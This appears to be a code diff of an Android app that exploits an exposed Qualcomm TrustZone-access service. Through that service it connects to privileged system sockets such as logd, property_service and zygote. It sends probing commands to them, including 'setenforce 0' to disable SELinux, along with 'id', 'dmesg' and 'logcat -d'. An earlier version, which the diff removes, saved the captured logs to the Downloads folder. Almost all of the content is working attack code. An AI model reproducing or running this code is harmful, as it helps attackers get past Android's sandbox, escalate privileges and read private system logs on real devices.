@@ -24,14 +24,14 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
-import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
@@ -45,7 +45,6 @@ public class MainActivity extends AppCompatActivity {
     private boolean isBound = false;
     private boolean isTesting = false;
     private List<String> successfulSockets = new ArrayList<>();
-    private Map<String, Integer> socketFdMap = new HashMap<>();
 
     private ServiceConnection serviceConnection = new ServiceConnection() {
         @Override
@@ -120,47 +119,34 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeFullTest() {
         isTesting = true;
-        appendLog("========== Initial Socket Discovery ==========");
+        appendLog("========== Socket Discovery Phase ==========");
 
-        String[] allSockets = {
-            "mdnsd", "ims_datad", "ims_qmid", "adbd", "tombstoned_java_trace",
-            "tombstoned_intercept", "tombstoned_crash", "dpmwrapper", "tcm",
-            "dpmd", "mlid", "ssgtzd", "ssgqmig", "statsdw", "thermal-send-rule",
-            "thermal-recv-passive-client", "thermal-recv-client", "thermal-send-client",
-            "netmgr", "qmux_gps", "qmux_bluetooth", "qmux_audio", "qmux_radio",
-            "lkspad", "lmkd", "pps", "zygote_secondary", "zygote",
-            "fwmarkd", "mdns", "dnsproxyd", "netd", "location", "qdma",
-            "logdw", "logdr", "logd", "property_service"
+        String[] targetSockets = {
+            "mdnsd", "tcm", "fwmarkd", "dnsproxyd", "logd", "property_service"
         };
 
-        int[] arrSizes = {1, 5, 10, 100, 1000};
+        int[] arrSizes = {1, 5};
 
-        for (String name : allSockets) {
+        for (String name : targetSockets) {
             String path = "/dev/socket/" + name;
-            boolean successAny = false;
+            boolean success = false;
             for (int size : arrSizes) {
                 int[] iArr = new int[size];
                 if (tryConnect(path, iArr)) {
-                    successAny = true;
+                    success = true;
                     successfulSockets.add(path);
-                    socketFdMap.put(path, iArr[0]);
-                    appendLog("SUCCESS: " + path + " FD=" + iArr[0]);
+                    appendLog("SUCCESS: " + path);
                     break;
                 }
-                try { Thread.sleep(50); } catch (InterruptedException ignored) {}
+                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
             }
-            if (!successAny) {
-                appendLog("FAIL: " + path);
-            }
+            if (!success) appendLog("FAIL: " + path);
         }
 
         appendLog("========== Deep Interaction Phase ==========");
         for (String path : successfulSockets) {
-            int fd = socketFdMap.get(path);
-            interactWithSocket(path, fd);
+            interactWithSocket(path);
         }
-
-        attemptBlockDeviceAccess();
 
         appendLog("========== All tests completed ==========");
         updateStatus("Done");
@@ -181,42 +167,68 @@ public class MainActivity extends AppCompatActivity {
         return false;
     }
 
-    private void interactWithSocket(String path, int fd) {
-        appendLog("--- Interacting with " + path + " (FD=" + fd + ") ---");
+    private void interactWithSocket(String path) {
+        appendLog("--- Interacting with " + path + " ---");
+        ParcelFileDescriptor pfd = null;
         try {
-            ParcelFileDescriptor pfd = ParcelFileDescriptor.adoptFd(fd);
+            int[] iArr = new int[1];
+            pfd = mRemoteService.a(path, iArr);
+            if (pfd == null) {
+                appendLog("  Re-connect failed");
+                return;
+            }
             java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
             if (fdesc == null || !fdesc.valid()) {
-                appendLog("  FD invalid, skip");
-                pfd.close();
+                appendLog("  FD invalid");
                 return;
             }
 
             OutputStream os = new FileOutputStream(fdesc);
             InputStream is = new FileInputStream(fdesc);
 
-            String[] commands = {
-                "help\n",
-                "status\n",
-                "version\n",
-                "getprop\n",
-                "id\n",
-                "setenforce 0\n",
-                "dmesg\n",
-                "list\n",
-                "dump\n",
-                "logcat -d\n",
-                "getLog\n",
-                "exit\n",
-                "\n"
-            };
+            List<byte[]> commands = new ArrayList<>();
 
-            for (String cmd : commands) {
-                appendLog("  Sending: " + cmd.replace("\n", "\\n"));
+            if (path.contains("logd")) {
+                commands.add("getLog\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("clear\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("logcat -d\n".getBytes(StandardCharsets.UTF_8));
+            } else if (path.contains("property_service")) {
+                commands.add("getprop\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("list\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop ro.build.version.release\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop ro.product.model\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop ro.product.brand\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop ro.product.device\n".getBytes(StandardCharsets.UTF_8));
+            } else {
+                commands.add("help\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("status\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("version\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("getprop\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("list\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("dump\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("logcat -d\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("id\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("setenforce 0\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("dmesg\n".getBytes(StandardCharsets.UTF_8));
+                commands.add("exit\n".getBytes(StandardCharsets.UTF_8));
+            }
+
+            for (byte[] cmd : commands) {
+                String cmdStr = new String(cmd, StandardCharsets.UTF_8).replace("\n", "\\n");
+                appendLog("  Sending: " + cmdStr);
                 try {
-                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
+                    os.write(cmd);
                     os.flush();
-                    byte[] buffer = new byte[4096];
+                    byte[] buffer = new byte[8192];
                     int len = is.read(buffer, 0, buffer.length);
                     if (len > 0) {
                         String response = new String(buffer, 0, len, StandardCharsets.UTF_8);
@@ -230,57 +242,11 @@ public class MainActivity extends AppCompatActivity {
                 try { Thread.sleep(200); } catch (InterruptedException ignored) {}
             }
 
-            if (path.contains("logd")) {
-                appendLog("  Trying logd specific: 'getLog'");
-                try {
-                    os.write("getLog\n".getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    byte[] buf = new byte[8192];
-                    int total = 0;
-                    while (total < 8192) {
-                        int r = is.read(buf, total, 8192 - total);
-                        if (r <= 0) break;
-                        total += r;
-                    }
-                    if (total > 0) {
-                        String logData = new String(buf, 0, total, StandardCharsets.UTF_8);
-                        appendLog("  Log data (first 500): " + logData.substring(0, Math.min(500, logData.length())));
-                        File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_socket.txt");
-                        try (FileOutputStream fos = new FileOutputStream(logFile)) {
-                            fos.write(buf, 0, total);
-                        }
-                        appendLog("  Log saved to " + logFile.getAbsolutePath());
-                    }
-                } catch (Exception e) {
-                    appendLog("  logd specific failed: " + e.getMessage());
-                }
-            }
-
-            if (path.contains("property_service")) {
-                appendLog("  Trying property_service: 'getprop ro.build.version.sdk'");
-                try {
-                    os.write("getprop ro.build.version.sdk\n".getBytes(StandardCharsets.UTF_8));
-                    os.flush();
-                    byte[] buf = new byte[1024];
-                    int len = is.read(buf);
-                    if (len > 0) {
-                        appendLog("  getprop response: " + new String(buf, 0, len, StandardCharsets.UTF_8));
-                    }
-                } catch (Exception e) {
-                    appendLog("  property_service getprop failed: " + e.getMessage());
-                }
-            }
-
             pfd.close();
         } catch (Exception e) {
             appendLog("  Interaction exception: " + e.toString());
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
         }
-    }
-
-    private void attemptBlockDeviceAccess() {
-        appendLog("--- Attempting block device access via socket (indirect) ---");
-        appendLog("  Direct block device access not possible. But we can read system properties from property_service if available.");
-        appendLog("  Logcat may contain partition info. We already saved logcat_from_socket.txt.");
     }
 
     private void appendLog(final String msg) {
